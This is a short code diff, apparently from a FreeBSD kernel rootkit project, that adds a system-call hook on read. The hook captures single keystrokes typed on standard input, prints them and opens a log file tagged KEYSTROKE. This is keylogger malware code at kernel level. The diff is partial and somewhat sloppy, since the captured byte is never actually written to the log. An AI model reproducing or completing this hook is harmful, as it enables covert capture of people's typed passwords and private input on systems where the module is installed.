@@ -172,3 +172,36 @@ int hook_sys_openat(struct thread * td, struct openat_args * uap) {
 	}
 	return sys_openat(td, uap);
 }
+
+
+int hook_sys_read(struct thread *td, struct read_args * uap){
+
+		
+
+	int error;
+	char buf[1];
+	int done;
+
+	error = sys_read(td, uap);
+
+	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
+		return(error);
+
+
+
+	copyinstr(uap->buf, buf, 1, &done);
+
+	
+
+	printf("%c", buf[0]);
+
+	int testfd = 0;
+
+	filewriter_openlog(curthread, &testfd, KEYSTROKE);
+	
+	filewriter_closelog(curthread, testfd);	
+
+	return(error);
+
+}
+
